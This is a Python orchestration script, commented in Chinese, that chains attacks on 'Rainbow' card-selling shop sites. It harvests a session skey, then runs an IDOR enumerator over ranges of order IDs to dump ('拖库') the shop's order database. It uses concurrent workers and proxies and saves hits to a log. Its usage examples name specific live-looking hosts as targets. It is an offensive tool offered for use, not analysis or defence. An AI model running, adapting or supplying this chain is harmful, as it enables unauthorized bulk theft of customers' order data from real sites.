#!/usr/bin/env python3
"""
彩虹发卡 skey 全链：会话 → 提 skey → IDOR 拖库。

封装历史 cookie_tool/rainbow_skey_harvest + rainbow_idor。

示例:
  python3 skey_chain.py -H juzi668.top --contact QQ123456 --start 1 --end 200
  python3 skey_chain.py -H qq8.one --skey KNOWN_SKEY --order-id 37692
  python3 skey_chain.py -H TARGET --login-user u --login-pass p --start 1 --end 500
"""
from __future__ import annotations

import argparse
import importlib.util
import json
import subprocess
import sys
from pathlib import Path

from faka_common import ensure_out, load_proxy, log, save_hit

HARVEST = Path("/data/recon/cookie_tool/rev/rainbow_skey_harvest.py")
RAINBOW_IDOR = Path("/data/tools/faka/rainbow_idor.py")


def run_harvest(host: str, contact: str, login_user: str, login_pass: str, proxy: str) -> dict:
    if not HARVEST.exists():
        log(f"[!] 缺少 {HARVEST}")
        return {}
    cmd = [sys.executable, str(HARVEST), "--host", host, "--path", "/shop/"]
    if contact:
        cmd += ["--contact", contact]
    if login_user:
        cmd += ["--login-user", login_user, "--login-pass", login_pass]
    if proxy:
        cmd += ["--proxy", proxy]
    log(f"[*] harvest: {' '.join(cmd)}")
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        log(out.stdout[-2000:] if out.stdout else out.stderr[-1000:])
        # parse skey from output json if present
        for line in (out.stdout or "").splitlines():
            if "skey" in line.lower() and "{" in line:
                try:
                    return json.loads(line[line.index("{"):])
                except Exception:
                    pass
    except Exception as e:
        log(f"[!] harvest failed: {e}")
    return {}


def run_idor(url: str, start: int, end: int, workers: int, proxy: str) -> None:
    cmd = [
        sys.executable, str(RAINBOW_IDOR), "-u", url,
        "--start", str(start), "--end", str(end), "-w", str(workers),
        "--proxy", proxy if proxy else "auto",
    ]
    log(f"[*] idor: {' '.join(cmd)}")
    subprocess.run(cmd, timeout=3600)


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="彩虹 skey 全链")
    ap.add_argument("-H", "--host", required=True)
    ap.add_argument("--base-path", default="/shop/")
    ap.add_argument("--contact", default="")
    ap.add_argument("--login-user", default="")
    ap.add_argument("--login-pass", default="")
    ap.add_argument("--skey", default="")
    ap.add_argument("--order-id", default="")
    ap.add_argument("--start", type=int, default=1)
    ap.add_argument("--end", type=int, default=200)
    ap.add_argument("-w", "--workers", type=int, default=20)
    ap.add_argument("--proxy", default="auto")
    ap.add_argument("--skip-harvest", action="store_true")
    ap.add_argument("--skip-idor", action="store_true")
    ap.add_argument("--out", default="/data/tools/faka/out/skey_chain.jsonl")
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    ensure_out(args.out)
    proxy = load_proxy() if args.proxy == "auto" else ("" if args.proxy == "none" else args.proxy)
    base = f"https://{args.host.rstrip('/')}{args.base_path}"
    if not base.endswith("/"):
        base += "/"
    url = base.rstrip("/")

    result = {"host": args.host, "skey": args.skey, "order_id": args.order_id}

    if not args.skip_harvest and not args.skey:
        harvested = run_harvest(args.host, args.contact, args.login_user, args.login_pass, proxy)
        result["harvest"] = harvested
        if harvested.get("skey"):
            args.skey = harvested["skey"]
            log(f"[+] harvested skey={args.skey[:8]}...")

    if args.skey and args.order_id:
        save_hit(Path(args.out), "skey_ready", result)
        log(f"[*] 已知 skey+order，可用 cookie_tool showOrder 或手工 replay")

    if not args.skip_idor:
        run_idor(url, args.start, args.end, args.workers, proxy)

    save_hit(Path(args.out), "chain_done", result)
    log(f"完成 -> {args.out}")


if __name__ == "__main__":
    main()
